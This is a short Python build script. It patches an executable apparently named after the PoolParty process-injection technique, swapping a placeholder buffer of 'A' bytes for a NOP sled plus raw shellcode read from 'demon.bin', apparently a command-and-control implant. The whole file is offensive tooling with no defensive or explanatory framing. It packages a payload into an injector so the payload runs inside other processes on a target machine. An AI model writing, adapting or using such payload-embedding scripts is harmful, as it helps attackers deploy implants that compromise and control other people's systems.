#!/usr/bin/env python

import os

shellcode = open("demon.bin", "rb").read()
print(len(shellcode))

cwd = os.getcwd()
# poolparty = open(f"{cwd}/PoolParty/PoolParty-master.exe", "rb").read()
poolparty = open("PoolParty-debug.exe", "rb").read()
nops = 199999 - len(shellcode)
#new_pp = poolparty.replace(b"A"*199999, b"B"*199999)
new_pp = poolparty.replace(b"A"*199999, b'\x90'*nops + shellcode)

open("PoolParty.exe", "wb").write(new_pp)